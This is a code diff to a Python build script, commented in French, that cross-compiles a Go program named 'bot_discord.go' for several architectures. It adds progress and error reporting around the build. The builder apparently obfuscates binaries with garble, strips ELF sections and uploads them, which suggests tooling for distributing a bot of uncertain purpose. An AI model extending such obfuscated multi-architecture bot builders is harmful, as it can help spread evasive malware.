@@ -822,9 +822,17 @@ class Builder:
         if _go_bin_dir not in _base_env.get('PATH', ''):
             _base_env['PATH'] = _go_bin_dir + os.pathsep + _base_env.get('PATH', '')
 
+        # Compte les arches à compiler
+        total_archs = len([1 for attr, _, _, _, _, _ in ARCHS if getattr(self.cfg, attr, False)])
+        current = 0
+
         for attr, label, goos, goarch, extra_env, out_name in ARCHS:
             if not getattr(self.cfg, attr):
                 continue
+            current += 1
+            pct = (current * 100) // total_archs
+            cprint(f"\n  [{pct:3d}%] ({current}/{total_archs}) Compilation {label}...", C.YELLOW)
+
             env_vars = _base_env.copy()
             env_vars['GOOS']        = goos
             env_vars['GOARCH']      = goarch
@@ -834,19 +842,28 @@ class Builder:
             _go = _garble_bin if _garble else _GO_BIN
             _args = ['-literals', '-tiny', '-seed=random'] if _garble else []
             cmd = [_go] + _args + ['build', f'-ldflags={ldflags_common}'] + _trimpath_flag + ['-o', out_name, 'bot_discord.go']
+
+            cprint(f"      Cmd: {' '.join(cmd[:3])}... {out_name}", C.BLUE)
             try:
-                r = subprocess.run(cmd, env=env_vars, capture_output=True, text=True)
+                r = subprocess.run(cmd, env=env_vars, capture_output=True, text=True, timeout=600)
                 if r.returncode == 0:
                     size = Path(out_name).stat().st_size // 1024
                     cprint(f"  [+] {label:<32} → {out_name} ({size} KB) ✓", C.GREEN)
                     strip_elf_sections(out_name)
                     built_bots.append((attr, out_name))
                 else:
-                    cprint(f"  [!] {label:<32} ÉCHEC", C.RED)
-                    for line in (r.stdout + r.stderr).strip().splitlines()[:4]:
-                        cprint(f"      {line}", C.RED)
-            except FileNotFoundError:
-                cprint(f"  [!] go non trouvé", C.RED)
+                    cprint(f"  [!] {label:<32} ÉCHEC (code {r.returncode})", C.RED)
+                    cprint(f"      STDOUT: {r.stdout[:200] if r.stdout else '(vide)'}", C.RED)
+                    cprint(f"      STDERR: {r.stderr[:200] if r.stderr else '(vide)'}", C.RED)
+                    if r.stdout or r.stderr:
+                        for line in (r.stdout + r.stderr).strip().splitlines()[:6]:
+                            cprint(f"      {line}", C.RED)
+            except subprocess.TimeoutExpired:
+                cprint(f"  [!] {label:<32} TIMEOUT (>10min)", C.RED)
+            except FileNotFoundError as e:
+                cprint(f"  [!] ERREUR: {e}", C.RED)
+            except Exception as e:
+                cprint(f"  [!] ERREUR INATTENDUE: {type(e).__name__}: {e}", C.RED)
 
         # Upload après tests QEMU (plus bas dans le code)
         bot_urls = {}
